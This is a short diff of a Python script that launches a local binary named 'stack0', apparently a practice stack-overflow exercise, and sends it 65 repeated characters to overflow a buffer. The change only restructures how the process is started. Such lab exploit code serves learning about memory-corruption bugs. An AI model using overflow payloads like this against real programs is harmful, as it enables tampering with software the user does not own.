@@ -9,15 +9,17 @@ BINARY_NAME = "stack0"
 
 def main():
     # LOCAL VARIABLES
-    payload = "H" * 65
     absBinFilename = os.path.join(os.getcwd(), BINARY_NAME)
+    payload = "H" * 65
+    commandList = []
 
     # VERIFY FILE    
     if not os.path.isfile(absBinFilename):
         raise IOError("{} not found".format(absBinFilename))
 
     # RUN IT
-    binary = Popen(absBinFilename, stdin = PIPE)
+    commandList.append(absBinFilename)
+    binary = Popen(commandList, stdin = PIPE)
     if binary is not None:
         binary.communicate(payload)
 
